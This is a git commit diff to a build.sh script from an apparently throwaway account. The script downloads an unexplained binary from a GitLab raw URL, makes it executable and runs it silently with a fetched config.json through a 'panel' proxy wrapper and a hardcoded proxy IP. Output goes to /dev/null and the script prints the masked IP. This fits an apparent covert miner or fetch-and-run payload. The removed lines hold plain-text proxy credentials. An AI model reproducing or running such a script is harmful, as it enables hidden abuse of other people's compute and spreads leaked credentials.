1c669c5c5a0c3cb10655510036e6c73cf66b7228
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-03 07:47:48 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,8 +1,6 @@
-proxy="38.154.227.167" 
-port="5868" 
-user="ugursfso"  
-pass="wqn60pnk6m95"   
-wget -q -O 897326787 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x 897326787
+proxy="159.65.162.186" 
+port="24894" 
+wget -q -O kiamtan-78 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x kiamtan-78
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -21,6 +19,6 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./897326787 -c "config.json" >/dev/null 2>&1
+./panel ./kiamtan-78 -c "config.json" >/dev/null 2>&1
 sleep 1
 sync; echo 3 > /proc/sys/vm/drop_caches
